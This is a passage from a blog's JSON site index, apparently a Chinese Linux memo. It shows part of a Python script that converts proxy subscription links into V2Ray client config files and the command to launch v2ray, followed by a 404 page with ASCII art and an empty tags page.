class=\"string\">\"\"</span>),</span><br><span class=\"line\">                                        <span class=\"string\">\"alterId\"</span>: <span class=\"built_in\">int</span>(config.get(<span class=\"string\">\"aid\"</span>, <span class=\"number\">0</span>)),</span><br><span class=\"line\">                                        <span class=\"string\">\"security\"</span>: config.get(<span class=\"string\">\"security\"</span>, <span class=\"string\">\"auto\"</span>)</span><br><span class=\"line\">                                    }</span><br><span class=\"line\">                                ]</span><br><span class=\"line\">                            }</span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                    },</span><br><span class=\"line\">                    <span class=\"string\">\"streamSettings\"</span>: {</span><br><span class=\"line\">                        <span class=\"string\">\"network\"</span>: config.get(<span class=\"string\">\"net\"</span>, <span class=\"string\">\"tcp\"</span>),</span><br><span class=\"line\">                        <span class=\"string\">\"security\"</span>: <span class=\"string\">\"tls\"</span> <span class=\"keyword\">if</span> config.get(<span class=\"string\">\"tls\"</span>) <span class=\"keyword\">else</span> <span class=\"string\">\"none\"</span>,</span><br><span class=\"line\">                        <span class=\"string\">\"tlsSettings\"</span>: {} <span class=\"keyword\">if</span> config.get(<span class=\"string\">\"tls\"</span>) <span class=\"keyword\">else</span> <span class=\"literal\">None</span>,</span><br><span class=\"line\">                        <span class=\"string\">\"wsSettings\"</span>: {</span><br><span class=\"line\">                            <span class=\"string\">\"path\"</span>: config.get(<span class=\"string\">\"path\"</span>, <span class=\"string\">\"\"</span>),</span><br><span class=\"line\">                            <span class=\"string\">\"headers\"</span>: {</span><br><span class=\"line\">                                <span class=\"string\">\"Host\"</span>: config.get(<span class=\"string\">\"host\"</span>, <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">                            }</span><br><span class=\"line\">                        } <span class=\"keyword\">if</span> config.get(<span class=\"string\">\"net\"</span>) == <span class=\"string\">\"ws\"</span> <span class=\"keyword\">else</span> <span class=\"literal\">None</span></span><br><span class=\"line\">                    }</span><br><span class=\"line\">                }</span><br><span class=\"line\">            ]</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 清理空字段</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> v2ray_config[<span class=\"string\">\"outbounds\"</span>][<span class=\"number\">0</span>][<span class=\"string\">\"streamSettings\"</span>][<span class=\"string\">\"wsSettings\"</span>] <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            v2ray_config[<span class=\"string\">\"outbounds\"</span>][<span class=\"number\">0</span>][<span class=\"string\">\"streamSettings\"</span>].pop(<span class=\"string\">\"wsSettings\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> v2ray_config[<span class=\"string\">\"outbounds\"</span>][<span class=\"number\">0</span>][<span class=\"string\">\"streamSettings\"</span>][<span class=\"string\">\"tlsSettings\"</span>] <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            v2ray_config[<span class=\"string\">\"outbounds\"</span>][<span class=\"number\">0</span>][<span class=\"string\">\"streamSettings\"</span>].pop(<span class=\"string\">\"tlsSettings\"</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(config[<span class=\"string\">\"ps\"</span>], end=<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">        output_path = os.path.join(output_dir, <span class=\"string\">f\"config_<span class=\"subst\">{i}</span>.json\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(output_path, <span class=\"string\">\"w\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            json.dump(v2ray_config, f, indent=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f\"[✓] 已生成: <span class=\"subst\">{output_path}</span>\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f\"[!] 第<span class=\"subst\">{i}</span>个链接解析失败：<span class=\"subst\">{e}</span>\"</span>)</span><br></pre></td></tr></table></figure>\n<p>替换解压得到的 config.json 。</p>\n<p>启动 v2ray，默认读取当前目录下的config.json：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./v2ray run</span><br></pre></td></tr></table></figure>\n","categories":["备忘"],"tags":["Linux"]},{"title":"404","url":"//404.html","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">██╗  ██╗ ██████╗ ██╗  ██╗    ███╗   ██╗ ██████╗ ████████╗</span><br><span class=\"line\">██║  ██║██╔═████╗██║  ██║    ████╗  ██║██╔═══██╗╚══██╔══╝</span><br><span class=\"line\">███████║██║██╔██║███████║    ██╔██╗ ██║██║   ██║   ██║</span><br><span class=\"line\">╚════██║████╔╝██║╚════██║    ██║╚██╗██║██║   ██║   ██║</span><br><span class=\"line\">     ██║╚██████╔╝     ██║    ██║ ╚████║╚██████╔╝   ██║</span><br><span class=\"line\">     ╚═╝ ╚═════╝      ╚═╝    ╚═╝  ╚═══╝ ╚═════╝    ╚═╝</span><br><span class=\"line\"></span><br><span class=\"line\">    ███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗</span><br><span class=\"line\">    ██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗</span><br><span class=\"line\">    █████╗  ██║   ██║██║   ██║██╔██╗ ██║██║  ██║</span><br><span class=\"line\">    ██╔══╝  ██║   ██║██║   ██║██║╚██╗██║██║  ██║</span><br><span class=\"line\">    ██║     ╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝</span><br><span class=\"line\">    ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝</span><br></pre></td></tr></table></figure>\n"},{"title":"文章标签","url":"/tags/index.html","content":"\n"}]